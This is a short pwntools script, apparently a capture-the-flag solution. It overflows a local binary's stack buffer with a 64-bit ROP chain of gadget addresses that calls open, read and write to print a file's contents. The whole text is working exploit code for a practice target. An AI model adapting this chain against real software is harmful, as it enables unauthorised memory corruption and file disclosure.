from pwn import *

p = process("./rop-2-64")

opn = p64(0x400510)
read = p64(0x4004f0)
write = p64(0x4004d0)
bsaddr = p64(0x601050)

zer = p64(0x600f48)


poprdi = p64(0x0000000000400743) # : pop rdi ; ret
poprdx = p64(0x0000000000400668) # : pop rdx ; ret
poprsi = p64(0x0000000000400741) # : pop rsi ; pop r15 ; ret



payload = "A"*136 + poprdi + zer + poprsi + "\x00"*16 + opn + poprdi + p64(0x3) + poprsi + bsaddr + "A"*8 + poprdx + p64(0x100) + read + poprdi + p64(0x1) + poprsi + bsaddr *2 + poprdx + p64(0x100) + write
p.sendline(payload)
print p.recv(timeout = 1)
